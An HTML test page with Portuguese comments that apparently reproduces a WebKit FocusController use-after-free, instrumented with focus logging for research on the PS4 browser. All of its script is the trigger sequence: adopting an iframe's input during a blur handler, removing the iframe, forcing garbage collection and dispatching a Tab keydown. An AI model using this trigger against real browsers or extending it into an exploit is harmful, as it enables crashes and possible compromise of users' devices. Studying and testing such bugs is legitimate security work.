<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>FocusController UAF - PS4 Focus Monitor</title>

<style>
body {
    font-family: sans-serif;
    margin: 20px;
}

#log {
    white-space: pre-wrap;
    font-family: monospace;
    font-size: 14px;
}
</style>
</head>

<body>

<div id="log">Carregando...</div>

<script>

/*
 * ============================================================
 * WebKit GC fallback
 * Baseado no gc.js fornecido
 * ============================================================
 */

if (!window.gc) {
    window.gc = function() {

        function gcRec(n) {
            if (n < 1)
                return {};

            var temp = {
                i: "ab" + i + (i / 100000)
            };

            temp += "foo";

            gcRec(n - 1);
        }

        for (var i = 0; i < 10000; i++)
            gcRec(10);
    };
}


/*
 * ============================================================
 * Logging
 * ============================================================
 */

var logElement = document.getElementById("log");

function log(message) {
    logElement.textContent += "\n" + message;
}

function describeElement(element) {

    if (!element)
        return "null";

    var result = element.tagName || element.nodeName;

    if (element.id)
        result += "#" + element.id;

    if (element.name)
        result += "[name=" + element.name + "]";

    return result;
}

function logFocusState(label) {

    log(
        "\n[" + label + "]" +
        "\n  document.hasFocus(): " + document.hasFocus() +
        "\n  activeElement: " +
            describeElement(document.activeElement)
    );
}


/*
 * ============================================================
 * Focus instrumentation
 *
 * Apenas observa.
 * Não altera o foco.
 * ============================================================
 */

window.addEventListener("focus", function() {
    logFocusState("WINDOW FOCUS");
});

window.addEventListener("blur", function() {
    logFocusState("WINDOW BLUR");
});

document.addEventListener("focusin", function(event) {
    log(
        "\n[FOCUSIN]" +
        "\n  target: " +
        describeElement(event.target) +
        "\n  activeElement: " +
        describeElement(document.activeElement)
    );
});

document.addEventListener("focusout", function(event) {
    log(
        "\n[FOCUSOUT]" +
        "\n  target: " +
        describeElement(event.target) +
        "\n  activeElement: " +
        describeElement(document.activeElement)
    );
});


/*
 * ============================================================
 * Original test structure
 * ============================================================
 */

var iframe = document.createElement("iframe");

iframe.id = "targetFrame";
iframe.tabIndex = 0;

iframe.srcdoc =
    "<input tabindex='0'>" +
    "<script>" +
    "parent.innerInput = document.querySelector('input');" +
    "<\/script>";

var outerInput = document.createElement("input");

outerInput.id = "outerInput";

document.body.appendChild(outerInput);
document.body.appendChild(iframe);


/*
 * ============================================================
 * Observe iframe loading
 * ============================================================
 */

iframe.onload = function() {

    logFocusState("IFRAME ONLOAD");

    setTimeout(runTest, 0);
};


/*
 * ============================================================
 * Original trigger
 * ============================================================
 */

function runTest() {

    logFocusState("ANTES DO TESTE");

    var innerInput = window.innerInput;

    window.innerInput = null;

    if (!innerInput) {

        log(
            "\nERRO: innerInput não encontrado."
        );

        return;
    }


    /*
     * --------------------------------------------------------
     * Original blur handler
     * --------------------------------------------------------
     */

    outerInput.addEventListener("blur", function() {

        logFocusState("BLUR HANDLER - ENTRADA");


        /*
         * Original:
         *
         * document.adoptNode(innerInput);
         */

        log("\n[1] adoptNode(innerInput)");

        document.adoptNode(innerInput);

        innerInput = null;


        /*
         * Original:
         *
         * iframe.remove();
         */

        log("\n[2] iframe.remove()");

        iframe.remove();

        iframe = null;


        /*
         * Original GC replacement.
         */

        log("\n[3] gc()");

        gc();


        logFocusState("BLUR HANDLER - FINAL");

    }, {
        once: true
    });


    /*
     * --------------------------------------------------------
     * IMPORTANTE:
     *
     * O estado de foco é registrado ANTES do focus().
     * --------------------------------------------------------
     */

    logFocusState("ANTES DE outerInput.focus()");


    /*
     * Original:
     *
     * outerInput.focus();
     */

    log("\n[4] outerInput.focus()");

    outerInput.focus();


    logFocusState("DEPOIS DE outerInput.focus()");


    /*
     * --------------------------------------------------------
     * Original KeyboardEvent
     * --------------------------------------------------------
     */

    log("\n[5] dispatch KeyboardEvent(Tab)");

    outerInput.dispatchEvent(
        new KeyboardEvent("keydown", {
            bubbles: true,
            cancelable: true,
            view: window,
            detail: 0,

            key: "Tab",
            code: "Tab",
            keyIdentifier: "U+0009",

            location: 222,

            ctrlKey: false,
            altKey: true,
            shiftKey: false,
            metaKey: false
        })
    );


    logFocusState("DEPOIS DO KEYDOWN");


    /*
     * Original final DOM mutation.
     */

    log("\n[6] document.body.innerHTML");

    document.body.innerHTML =
        "<p>This test passes if PASS (no crash)</p>";
}

</script>

</body>
</html>
